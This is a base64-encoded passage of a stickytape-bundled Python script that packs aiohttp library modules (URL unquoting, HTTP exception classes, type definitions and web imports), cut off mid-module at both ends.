CAgIHNlbGYuX3F1b3RlciA9IF9RdW90ZXIoKVxyXG4gICAgICAgIHNlbGYuX3FzX3F1b3RlciA9IF9RdW90ZXIocXM9VHJ1ZSlcclxuXHJcbiAgICBkZWYgX19jYWxsX18oc2VsZiwgdmFsOiBPcHRpb25hbFtzdHJdKSAtPiBPcHRpb25hbFtzdHJdOlxyXG4gICAgICAgIGlmIHZhbCBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHZhbCwgc3RyKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJBcmd1bWVudCBzaG91bGQgYmUgc3RyIilcclxuICAgICAgICBpZiBub3QgdmFsOlxyXG4gICAgICAgICAgICByZXR1cm4gIiJcclxuICAgICAgICBkZWNvZGVyID0gY2FzdChjb2RlY3MuQnVmZmVyZWRJbmNyZW1lbnRhbERlY29kZXIsIHV0ZjhfZGVjb2RlcigpKVxyXG4gICAgICAgIHJldCA9IFtdXHJcbiAgICAgICAgaWR4ID0gMFxyXG4gICAgICAgIHdoaWxlIGlkeCA8IGxlbih2YWwpOlxyXG4gICAgICAgICAgICBjaCA9IHZhbFtpZHhdXHJcbiAgICAgICAgICAgIGlkeCArPSAxXHJcbiAgICAgICAgICAgIGlmIGNoID09ICIlIiBhbmQgaWR4IDw9IGxlbih2YWwpIC0gMjpcclxuICAgICAgICAgICAgICAgIHBjdCA9IHZhbFtpZHggOiBpZHggKyAyXVxyXG4gICAgICAgICAgICAgICAgaWYgX0lTX0hFWF9TVFIuZnVsbG1hdGNoKHBjdCk6XHJcbiAgICAgICAgICAgICAgICAgICAgYiA9IGJ5dGVzKFtpbnQocGN0LCBiYXNlPTE2KV0pXHJcbiAgICAgICAgICAgICAgICAgICAgaWR4ICs9IDJcclxuICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHVucXVvdGVkID0gZGVjb2Rlci5kZWNvZGUoYilcclxuICAgICAgICAgICAgICAgICAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9wY3QgPSBpZHggLSAzIC0gbGVuKGRlY29kZXIuYnVmZmVyKSAqIDNcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0LmFwcGVuZCh2YWxbc3RhcnRfcGN0IDogaWR4IC0gM10pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlY29kZXIucmVzZXQoKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnF1b3RlZCA9IGRlY29kZXIuZGVjb2RlKGIpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBVbmljb2RlRGVjb2RlRXJyb3I6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXQuYXBwZW5kKHZhbFtpZHggLSAzIDogaWR4XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHVucXVvdGVkOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuX3FzIGFuZCB1bnF1b3RlZCBpbiAiKz0mOyI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRvX2FkZCA9IHNlbGYuX3FzX3F1b3Rlcih1bnF1b3RlZClcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9fYWRkIGlzIE5vbmU6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiQ2Fubm90IHF1b3RlIE5vbmUiKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXQuYXBwZW5kKHRvX2FkZClcclxuICAgICAgICAgICAgICAgICAgICBlbGlmIHVucXVvdGVkIGluIHNlbGYuX3Vuc2FmZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgdG9fYWRkID0gc2VsZi5fcXVvdGVyKHVucXVvdGVkKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiB0b19hZGQgaXMgTm9uZTogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDYW5ub3QgcXVvdGUgTm9uZSIpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldC5hcHBlbmQodG9fYWRkKVxyXG4gICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldC5hcHBlbmQodW5xdW90ZWQpXHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIGlmIGRlY29kZXIuYnVmZmVyOlxyXG4gICAgICAgICAgICAgICAgc3RhcnRfcGN0ID0gaWR4IC0gMSAtIGxlbihkZWNvZGVyLmJ1ZmZlcikgKiAzXHJcbiAgICAgICAgICAgICAgICByZXQuYXBwZW5kKHZhbFtzdGFydF9wY3QgOiBpZHggLSAxXSlcclxuICAgICAgICAgICAgICAgIGRlY29kZXIucmVzZXQoKVxyXG5cclxuICAgICAgICAgICAgaWYgY2ggPT0gIisiOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuX3FzIG9yIGNoIGluIHNlbGYuX3Vuc2FmZTpcclxuICAgICAgICAgICAgICAgICAgICByZXQuYXBwZW5kKCIrIilcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgcmV0LmFwcGVuZCgiICIpXHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgaWYgY2ggaW4gc2VsZi5fdW5zYWZlOlxyXG4gICAgICAgICAgICAgICAgcmV0LmFwcGVuZCgiJSIpXHJcbiAgICAgICAgICAgICAgICBoID0gaGV4KG9yZChjaCkpLnVwcGVyKClbMjpdXHJcbiAgICAgICAgICAgICAgICBmb3IgY2ggaW4gaDpcclxuICAgICAgICAgICAgICAgICAgICByZXQuYXBwZW5kKGNoKVxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIHJldC5hcHBlbmQoY2gpXHJcblxyXG4gICAgICAgIGlmIGRlY29kZXIuYnVmZmVyOlxyXG4gICAgICAgICAgICByZXQuYXBwZW5kKHZhbFstbGVuKGRlY29kZXIuYnVmZmVyKSAqIDMgOl0pXHJcblxyXG4gICAgICAgIHJldDIgPSAiIi5qb2luKHJldClcclxuICAgICAgICBpZiByZXQyID09IHZhbDpcclxuICAgICAgICAgICAgcmV0dXJuIHZhbFxyXG4gICAgICAgIHJldHVybiByZXQyXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL2h0dHAucHknLCBiJ2ltcG9ydCBodHRwLnNlcnZlclxyXG5pbXBvcnQgc3lzXHJcbmZyb20gdHlwaW5nIGltcG9ydCBNYXBwaW5nLCBUdXBsZVxyXG5cclxuZnJvbSAuIGltcG9ydCBfX3ZlcnNpb25fX1xyXG5mcm9tIC5odHRwX2V4Y2VwdGlvbnMgaW1wb3J0IEh0dHBQcm9jZXNzaW5nRXJyb3IgYXMgSHR0cFByb2Nlc3NpbmdFcnJvclxyXG5mcm9tIC5odHRwX3BhcnNlciBpbXBvcnQgKFxyXG4gICAgSGVhZGVyc1BhcnNlciBhcyBIZWFkZXJzUGFyc2VyLFxyXG4gICAgSHR0cFBhcnNlciBhcyBIdHRwUGFyc2VyLFxyXG4gICAgSHR0cFJlcXVlc3RQYXJzZXIgYXMgSHR0cFJlcXVlc3RQYXJzZXIsXHJcbiAgICBIdHRwUmVzcG9uc2VQYXJzZXIgYXMgSHR0cFJlc3BvbnNlUGFyc2VyLFxyXG4gICAgUmF3UmVxdWVzdE1lc3NhZ2UgYXMgUmF3UmVxdWVzdE1lc3NhZ2UsXHJcbiAgICBSYXdSZXNwb25zZU1lc3NhZ2UgYXMgUmF3UmVzcG9uc2VNZXNzYWdlLFxyXG4pXHJcbmZyb20gLmh0dHBfd2Vic29ja2V0IGltcG9ydCAoXHJcbiAgICBXU19DTE9TRURfTUVTU0FHRSBhcyBXU19DTE9TRURfTUVTU0FHRSxcclxuICAgIFdTX0NMT1NJTkdfTUVTU0FHRSBhcyBXU19DTE9TSU5HX01FU1NBR0UsXHJcbiAgICBXU19LRVkgYXMgV1NfS0VZLFxyXG4gICAgV2ViU29ja2V0RXJyb3IgYXMgV2ViU29ja2V0RXJyb3IsXHJcbiAgICBXZWJTb2NrZXRSZWFkZXIgYXMgV2ViU29ja2V0UmVhZGVyLFxyXG4gICAgV2ViU29ja2V0V3JpdGVyIGFzIFdlYlNvY2tldFdyaXRlcixcclxuICAgIFdTQ2xvc2VDb2RlIGFzIFdTQ2xvc2VDb2RlLFxyXG4gICAgV1NNZXNzYWdlIGFzIFdTTWVzc2FnZSxcclxuICAgIFdTTXNnVHlwZSBhcyBXU01zZ1R5cGUsXHJcbiAgICB3c19leHRfZ2VuIGFzIHdzX2V4dF9nZW4sXHJcbiAgICB3c19leHRfcGFyc2UgYXMgd3NfZXh0X3BhcnNlLFxyXG4pXHJcbmZyb20gLmh0dHBfd3JpdGVyIGltcG9ydCAoXHJcbiAgICBIdHRwVmVyc2lvbiBhcyBIdHRwVmVyc2lvbixcclxuICAgIEh0dHBWZXJzaW9uMTAgYXMgSHR0cFZlcnNpb24xMCxcclxuICAgIEh0dHBWZXJzaW9uMTEgYXMgSHR0cFZlcnNpb24xMSxcclxuICAgIFN0cmVhbVdyaXRlciBhcyBTdHJlYW1Xcml0ZXIsXHJcbilcclxuXHJcbl9fYWxsX18gPSAoXHJcbiAgICAiSHR0cFByb2Nlc3NpbmdFcnJvciIsXHJcbiAgICAiUkVTUE9OU0VTIixcclxuICAgICJTRVJWRVJfU09GVFdBUkUiLFxyXG4gICAgIyAuaHR0cF93cml0ZXJcclxuICAgICJTdHJlYW1Xcml0ZXIiLFxyXG4gICAgIkh0dHBWZXJzaW9uIixcclxuICAgICJIdHRwVmVyc2lvbjEwIixcclxuICAgICJIdHRwVmVyc2lvbjExIixcclxuICAgICMgLmh0dHBfcGFyc2VyXHJcbiAgICAiSGVhZGVyc1BhcnNlciIsXHJcbiAgICAiSHR0cFBhcnNlciIsXHJcbiAgICAiSHR0cFJlcXVlc3RQYXJzZXIiLFxyXG4gICAgIkh0dHBSZXNwb25zZVBhcnNlciIsXHJcbiAgICAiUmF3UmVxdWVzdE1lc3NhZ2UiLFxyXG4gICAgIlJhd1Jlc3BvbnNlTWVzc2FnZSIsXHJcbiAgICAjIC5odHRwX3dlYnNvY2tldFxyXG4gICAgIldTX0NMT1NFRF9NRVNTQUdFIixcclxuICAgICJXU19DTE9TSU5HX01FU1NBR0UiLFxyXG4gICAgIldTX0tFWSIsXHJcbiAgICAiV2ViU29ja2V0UmVhZGVyIixcclxuICAgICJXZWJTb2NrZXRXcml0ZXIiLFxyXG4gICAgIndzX2V4dF9nZW4iLFxyXG4gICAgIndzX2V4dF9wYXJzZSIsXHJcbiAgICAiV1NNZXNzYWdlIixcclxuICAgICJXZWJTb2NrZXRFcnJvciIsXHJcbiAgICAiV1NNc2dUeXBlIixcclxuICAgICJXU0Nsb3NlQ29kZSIsXHJcbilcclxuXHJcblxyXG5TRVJWRVJfU09GVFdBUkUgPSAiUHl0aG9uL3swWzBdfS57MFsxXX0gYWlvaHR0cC97MX0iLmZvcm1hdChcclxuICAgIHN5cy52ZXJzaW9uX2luZm8sIF9fdmVyc2lvbl9fXHJcbikgICMgdHlwZTogc3RyXHJcblxyXG5SRVNQT05TRVMgPSAoXHJcbiAgICBodHRwLnNlcnZlci5CYXNlSFRUUFJlcXVlc3RIYW5kbGVyLnJlc3BvbnNlc1xyXG4pICAjIHR5cGU6IE1hcHBpbmdbaW50LCBUdXBsZVtzdHIsIHN0cl1dXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL2h0dHBfZXhjZXB0aW9ucy5weScsIGInIiIiTG93LWxldmVsIGh0dHAgcmVsYXRlZCBleGNlcHRpb25zLiIiIlxyXG5cclxuXHJcbmZyb20gdHlwaW5nIGltcG9ydCBPcHRpb25hbCwgVW5pb25cclxuXHJcbmZyb20gLnR5cGVkZWZzIGltcG9ydCBfQ0lNdWx0aURpY3RcclxuXHJcbl9fYWxsX18gPSAoIkh0dHBQcm9jZXNzaW5nRXJyb3IiLClcclxuXHJcblxyXG5jbGFzcyBIdHRwUHJvY2Vzc2luZ0Vycm9yKEV4Y2VwdGlvbik6XHJcbiAgICAiIiJIVFRQIGVycm9yLlxyXG5cclxuICAgIFNob3J0Y3V0IGZvciByYWlzaW5nIEhUVFAgZXJyb3JzIHdpdGggY3VzdG9tIGNvZGUsIG1lc3NhZ2UgYW5kIGhlYWRlcnMuXHJcblxyXG4gICAgY29kZTogSFRUUCBFcnJvciBjb2RlLlxyXG4gICAgbWVzc2FnZTogKG9wdGlvbmFsKSBFcnJvciBtZXNzYWdlLlxyXG4gICAgaGVhZGVyczogKG9wdGlvbmFsKSBIZWFkZXJzIHRvIGJlIHNlbnQgaW4gcmVzcG9uc2UsIGEgbGlzdCBvZiBwYWlyc1xyXG4gICAgIiIiXHJcblxyXG4gICAgY29kZSA9IDBcclxuICAgIG1lc3NhZ2UgPSAiIlxyXG4gICAgaGVhZGVycyA9IE5vbmVcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICAqLFxyXG4gICAgICAgIGNvZGU6IE9wdGlvbmFsW2ludF0gPSBOb25lLFxyXG4gICAgICAgIG1lc3NhZ2U6IHN0ciA9ICIiLFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW19DSU11bHRpRGljdF0gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGNvZGUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuY29kZSA9IGNvZGVcclxuICAgICAgICBzZWxmLmhlYWRlcnMgPSBoZWFkZXJzXHJcbiAgICAgICAgc2VsZi5tZXNzYWdlID0gbWVzc2FnZVxyXG5cclxuICAgIGRlZiBfX3N0cl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gZiJ7c2VsZi5jb2RlfSwgbWVzc2FnZT17c2VsZi5tZXNzYWdlIXJ9IlxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIGYiPHtzZWxmLl9fY2xhc3NfXy5fX25hbWVfX306IHtzZWxmfT4iXHJcblxyXG5cclxuY2xhc3MgQmFkSHR0cE1lc3NhZ2UoSHR0cFByb2Nlc3NpbmdFcnJvcik6XHJcblxyXG4gICAgY29kZSA9IDQwMFxyXG4gICAgbWVzc2FnZSA9ICJCYWQgUmVxdWVzdCJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgbWVzc2FnZTogc3RyLCAqLCBoZWFkZXJzOiBPcHRpb25hbFtfQ0lNdWx0aURpY3RdID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKG1lc3NhZ2U9bWVzc2FnZSwgaGVhZGVycz1oZWFkZXJzKVxyXG4gICAgICAgIHNlbGYuYXJncyA9IChtZXNzYWdlLClcclxuXHJcblxyXG5jbGFzcyBIdHRwQmFkUmVxdWVzdChCYWRIdHRwTWVzc2FnZSk6XHJcblxyXG4gICAgY29kZSA9IDQwMFxyXG4gICAgbWVzc2FnZSA9ICJCYWQgUmVxdWVzdCJcclxuXHJcblxyXG5jbGFzcyBQYXlsb2FkRW5jb2RpbmdFcnJvcihCYWRIdHRwTWVzc2FnZSk6XHJcbiAgICAiIiJCYXNlIGNsYXNzIGZvciBwYXlsb2FkIGVycm9ycyIiIlxyXG5cclxuXHJcbmNsYXNzIENvbnRlbnRFbmNvZGluZ0Vycm9yKFBheWxvYWRFbmNvZGluZ0Vycm9yKTpcclxuICAgICIiIkNvbnRlbnQgZW5jb2RpbmcgZXJyb3IuIiIiXHJcblxyXG5cclxuY2xhc3MgVHJhbnNmZXJFbmNvZGluZ0Vycm9yKFBheWxvYWRFbmNvZGluZ0Vycm9yKTpcclxuICAgICIiInRyYW5zZmVyIGVuY29kaW5nIGVycm9yLiIiIlxyXG5cclxuXHJcbmNsYXNzIENvbnRlbnRMZW5ndGhFcnJvcihQYXlsb2FkRW5jb2RpbmdFcnJvcik6XHJcbiAgICAiIiJOb3QgZW5vdWdoIGRhdGEgZm9yIHNhdGlzZnkgY29udGVudCBsZW5ndGggaGVhZGVyLiIiIlxyXG5cclxuXHJcbmNsYXNzIExpbmVUb29Mb25nKEJhZEh0dHBNZXNzYWdlKTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLCBsaW5lOiBzdHIsIGxpbWl0OiBzdHIgPSAiVW5rbm93biIsIGFjdHVhbF9zaXplOiBzdHIgPSAiVW5rbm93biJcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKFxyXG4gICAgICAgICAgICBmIkdvdCBtb3JlIHRoYW4ge2xpbWl0fSBieXRlcyAoe2FjdHVhbF9zaXplfSkgd2hlbiByZWFkaW5nIHtsaW5lfS4iXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuYXJncyA9IChsaW5lLCBsaW1pdCwgYWN0dWFsX3NpemUpXHJcblxyXG5cclxuY2xhc3MgSW52YWxpZEhlYWRlcihCYWRIdHRwTWVzc2FnZSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgaGRyOiBVbmlvbltieXRlcywgc3RyXSkgLT4gTm9uZTpcclxuICAgICAgICBpZiBpc2luc3RhbmNlKGhkciwgYnl0ZXMpOlxyXG4gICAgICAgICAgICBoZHIgPSBoZHIuZGVjb2RlKCJ1dGYtOCIsICJzdXJyb2dhdGVlc2NhcGUiKVxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oZiJJbnZhbGlkIEhUVFAgSGVhZGVyOiB7aGRyfSIpXHJcbiAgICAgICAgc2VsZi5oZHIgPSBoZHJcclxuICAgICAgICBzZWxmLmFyZ3MgPSAoaGRyLClcclxuXHJcblxyXG5jbGFzcyBCYWRTdGF0dXNMaW5lKEJhZEh0dHBNZXNzYWdlKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBsaW5lOiBzdHIgPSAiIikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShsaW5lLCBzdHIpOlxyXG4gICAgICAgICAgICBsaW5lID0gcmVwcihsaW5lKVxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oZiJCYWQgc3RhdHVzIGxpbmUge2xpbmUhcn0iKVxyXG4gICAgICAgIHNlbGYuYXJncyA9IChsaW5lLClcclxuICAgICAgICBzZWxmLmxpbmUgPSBsaW5lXHJcblxyXG5cclxuY2xhc3MgSW52YWxpZFVSTEVycm9yKEJhZEh0dHBNZXNzYWdlKTpcclxuICAgIHBhc3NcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvdHlwZWRlZnMucHknLCBiJ2ltcG9ydCBqc29uXHJcbmltcG9ydCBvc1xyXG5pbXBvcnQgc3lzXHJcbmZyb20gdHlwaW5nIGltcG9ydCAoXHJcbiAgICBUWVBFX0NIRUNLSU5HLFxyXG4gICAgQW55LFxyXG4gICAgQXdhaXRhYmxlLFxyXG4gICAgQ2FsbGFibGUsXHJcbiAgICBJdGVyYWJsZSxcclxuICAgIE1hcHBpbmcsXHJcbiAgICBUdXBsZSxcclxuICAgIFVuaW9uLFxyXG4pXHJcblxyXG5mcm9tIG11bHRpZGljdCBpbXBvcnQgQ0lNdWx0aURpY3QsIENJTXVsdGlEaWN0UHJveHksIE11bHRpRGljdCwgTXVsdGlEaWN0UHJveHksIGlzdHJcclxuZnJvbSB5YXJsIGltcG9ydCBVUkxcclxuXHJcbiMgVGhlc2UgYXJlIGZvciBvdGhlciBtb2R1bGVzIHRvIHVzZSAodG8gYXZvaWQgcmVwZWF0aW5nIHRoZSBjb25kaXRpb25hbCBpbXBvcnQpLlxyXG5pZiBzeXMudmVyc2lvbl9pbmZvID49ICgzLCA4KTpcclxuICAgIGZyb20gdHlwaW5nIGltcG9ydCBGaW5hbCBhcyBGaW5hbCwgUHJvdG9jb2wgYXMgUHJvdG9jb2wsIFR5cGVkRGljdCBhcyBUeXBlZERpY3RcclxuZWxzZTpcclxuICAgIGZyb20gdHlwaW5nX2V4dGVuc2lvbnMgaW1wb3J0ICggICMgbm9xYTogRjQwMVxyXG4gICAgICAgIEZpbmFsLFxyXG4gICAgICAgIFByb3RvY29sIGFzIFByb3RvY29sLFxyXG4gICAgICAgIFR5cGVkRGljdCBhcyBUeXBlZERpY3QsXHJcbiAgICApXHJcblxyXG5ERUZBVUxUX0pTT05fRU5DT0RFUiA9IGpzb24uZHVtcHNcclxuREVGQVVMVF9KU09OX0RFQ09ERVIgPSBqc29uLmxvYWRzXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBfQ0lNdWx0aURpY3QgPSBDSU11bHRpRGljdFtzdHJdXHJcbiAgICBfQ0lNdWx0aURpY3RQcm94eSA9IENJTXVsdGlEaWN0UHJveHlbc3RyXVxyXG4gICAgX011bHRpRGljdCA9IE11bHRpRGljdFtzdHJdXHJcbiAgICBfTXVsdGlEaWN0UHJveHkgPSBNdWx0aURpY3RQcm94eVtzdHJdXHJcbiAgICBmcm9tIGh0dHAuY29va2llcyBpbXBvcnQgQmFzZUNvb2tpZSwgTW9yc2VsXHJcblxyXG4gICAgZnJvbSAud2ViIGltcG9ydCBSZXF1ZXN0LCBTdHJlYW1SZXNwb25zZVxyXG5lbHNlOlxyXG4gICAgX0NJTXVsdGlEaWN0ID0gQ0lNdWx0aURpY3RcclxuICAgIF9DSU11bHRpRGljdFByb3h5ID0gQ0lNdWx0aURpY3RQcm94eVxyXG4gICAgX011bHRpRGljdCA9IE11bHRpRGljdFxyXG4gICAgX011bHRpRGljdFByb3h5ID0gTXVsdGlEaWN0UHJveHlcclxuXHJcbkJ5dGVpc2ggPSBVbmlvbltieXRlcywgYnl0ZWFycmF5LCBtZW1vcnl2aWV3XVxyXG5KU09ORW5jb2RlciA9IENhbGxhYmxlW1tBbnldLCBzdHJdXHJcbkpTT05EZWNvZGVyID0gQ2FsbGFibGVbW3N0cl0sIEFueV1cclxuTG9vc2VIZWFkZXJzID0gVW5pb25bTWFwcGluZ1tVbmlvbltzdHIsIGlzdHJdLCBzdHJdLCBfQ0lNdWx0aURpY3QsIF9DSU11bHRpRGljdFByb3h5XVxyXG5SYXdIZWFkZXJzID0gVHVwbGVbVHVwbGVbYnl0ZXMsIGJ5dGVzXSwgLi4uXVxyXG5TdHJPclVSTCA9IFVuaW9uW3N0ciwgVVJMXVxyXG5cclxuTG9vc2VDb29raWVzTWFwcGluZ3MgPSBNYXBwaW5nW3N0ciwgVW5pb25bc3RyLCAiQmFzZUNvb2tpZVtzdHJdIiwgIk1vcnNlbFtBbnldIl1dXHJcbkxvb3NlQ29va2llc0l0ZXJhYmxlcyA9IEl0ZXJhYmxlW1xyXG4gICAgVHVwbGVbc3RyLCBVbmlvbltzdHIsICJCYXNlQ29va2llW3N0cl0iLCAiTW9yc2VsW0FueV0iXV1cclxuXVxyXG5Mb29zZUNvb2tpZXMgPSBVbmlvbltcclxuICAgIExvb3NlQ29va2llc01hcHBpbmdzLFxyXG4gICAgTG9vc2VDb29raWVzSXRlcmFibGVzLFxyXG4gICAgIkJhc2VDb29raWVbc3RyXSIsXHJcbl1cclxuXHJcbkhhbmRsZXIgPSBDYWxsYWJsZVtbIlJlcXVlc3QiXSwgQXdhaXRhYmxlWyJTdHJlYW1SZXNwb25zZSJdXVxyXG5cclxuUGF0aExpa2UgPSBVbmlvbltzdHIsICJvcy5QYXRoTGlrZVtzdHJdIl1cclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvd2ViLnB5JywgYidpbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgbG9nZ2luZ1xyXG5pbXBvcnQgc29ja2V0XHJcbmltcG9ydCBzeXNcclxuZnJvbSBhcmdwYXJzZSBpbXBvcnQgQXJndW1lbnRQYXJzZXJcclxuZnJvbSBjb2xsZWN0aW9ucy5hYmMgaW1wb3J0IEl0ZXJhYmxlXHJcbmZyb20gaW1wb3J0bGliIGltcG9ydCBpbXBvcnRfbW9kdWxlXHJcbmZyb20gdHlwaW5nIGltcG9ydCAoXHJcbiAgICBBbnksXHJcbiAgICBBd2FpdGFibGUsXHJcbiAgICBDYWxsYWJsZSxcclxuICAgIEl0ZXJhYmxlIGFzIFR5cGluZ0l0ZXJhYmxlLFxyXG4gICAgTGlzdCxcclxuICAgIE9wdGlvbmFsLFxyXG4gICAgU2V0LFxyXG4gICAgVHlwZSxcclxuICAgIFVuaW9uLFxyXG4gICAgY2FzdCxcclxuKVxyXG5cclxuZnJvbSAuYWJjIGltcG9ydCBBYnN0cmFjdEFjY2Vzc0xvZ2dlclxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBhbGxfdGFza3NcclxuZnJvbSAubG9nIGltcG9ydCBhY2Nlc3NfbG9nZ2VyXHJcbmZyb20gLndlYl9hcHAgaW1wb3J0IEFwcGxpY2F0aW9uIGFzIEFwcGxpY2F0aW9uLCBDbGVhbnVwRXJyb3IgYXMgQ2xlYW51cEVycm9yXHJcbmZyb20gLndlYl9leGNlcHRpb25zIGltcG9ydCAoXHJcbiAgICBIVFRQQWNjZXB0ZWQgYXMgSFRUUEFjY2VwdGVkLFxyXG4gICAgSFRUUEJhZEdhdGV3YXkgYXMgSFRUUEJhZEdhdGV3YXksXHJcbiAgICBIVFRQQmFkUmVxdWVzdCBhcyBIVFRQQmFkUmVxdWVzdCxcclxuICAgIEhUVFBDbGllbnRFcnJvciBhcyBIVFRQQ2xpZW50RXJyb3IsXHJcbiAgICBIVFRQQ29uZmxpY3QgYXMgSFRUUENvbmZsaWN0LFxyXG4gICAgSFRUUENyZWF0ZWQgYXMgSFRUUENyZWF0ZWQsXHJcbiAgICBIVFRQRXJyb3IgYXMgSFRUUEVycm9yLFxyXG4gICAgSFRUUEV4Y2VwdGlvbiBhcyBIVFRQRXhjZXB0aW9uLFxyXG4gICAgSFRUUEV4cGVjdGF0aW9uRmFpbGVkIGFzIEhUVFBFeHBlY3RhdGlvbkZhaWxlZCxcclxuICAgIEhUVFBGYWlsZWREZXBlbmRlbmN5IGFzIEhUVFBGYWlsZWREZXBlbmRlbmN5LFxyXG4gICAgSFRUUEZvcmJpZGRlbiBhcyBIVFRQRm9yYmlkZGVuLFxyXG4gICAgSFRUUEZvdW5kIGFzIEhUVFBGb3VuZCxcclxuICAgIEhUVFBHYXRld2F5VGltZW91dCBhcyBIVFRQR2F0ZXdheVRpbWVvdXQsXHJcbiAgICBIVFRQR29uZSBhcyBIVFRQR29uZSxcclxuICAgIEhUVFBJbnN1ZmZpY2llbnRTdG9yYWdlIGFzIEhUVFBJbnN1ZmZpY2llbnRTdG9yYWdlLFxyXG4gICAgSFRUUEludGVybmFsU2VydmVyRXJyb3IgYXMgSFRUUEludGVybmFsU2VydmVyRXJyb3IsXHJcbiAgICBIVFRQTGVuZ3RoUmVxdWlyZWQgYXMgSFRUUExlbmd0aFJlcXVpcmVkLFxyXG4gICAgSFRUUE1ldGhvZE5vdEFsbG93ZWQgYXMgSFRUUE1ldGhvZE5vdEFsbG93ZWQsXHJcbiAgICBIVFRQTWlzZGlyZWN0ZWRSZXF1ZXN0IGFzIEhUVFBNaXNkaXJlY3RlZFJlcXVlc3QsXHJcbiAgICBIVFRQTW92ZWRQZXJtYW5lbnRseSBhcyBIVFRQTW92ZWRQZXJtYW5lbnRseSxcclxuICAgIEhUVFBNdWx0aXBsZUNob2ljZXMgYXMgSFRUUE11bHRpcGxlQ2hvaWNlcyxcclxuICAgIEhUVFBOZXR3b3JrQXV0aGVudGljYXRpb25SZXF1aXJlZCBhcyBIVFRQTmV0d29ya0F1dGhlbnRpY2F0aW9uUmVxdWlyZWQsXHJcbiAgICBIVFRQTm9Db250ZW50IGFzIEhUVFBOb0NvbnRlbnQsXHJcbiAgICBIVFRQTm9uQXV0aG9yaXRhdGl2ZUluZm9ybWF0aW9uIGFzIEhUVFBOb25BdXRob3JpdGF0aXZlSW5mb3JtYXRpb24sXHJcbiAgICBIVFRQTm90QWNjZXB0YWJsZSBhcyBIVFRQTm90QWNjZXB0YWJsZSxcclxuICAgIEhUVFBOb3RFeHRlbmRlZCBhcyBIVFRQTm90RXh0ZW5kZWQsXHJcbiAgICBIVFRQTm90Rm91bmQgYXMgSFRUUE5vdEZvdW5kLFxyXG4gICAgSFRUUE5vdEltcGxlbWVudGVkIGFzIEhUVFBOb3RJbXBsZW1lbnRlZCxcclxuICAgIEhUVFBOb3RNb2RpZmllZCBhcyBIVFRQTm90TW9kaWZpZWQsXHJcbiAgICBIVFRQT2sgYXMgSFRUUE9rLFxyXG4gICAgSFRUUFBhcnRpYWxDb250ZW50IGFzIEhUVFBQYX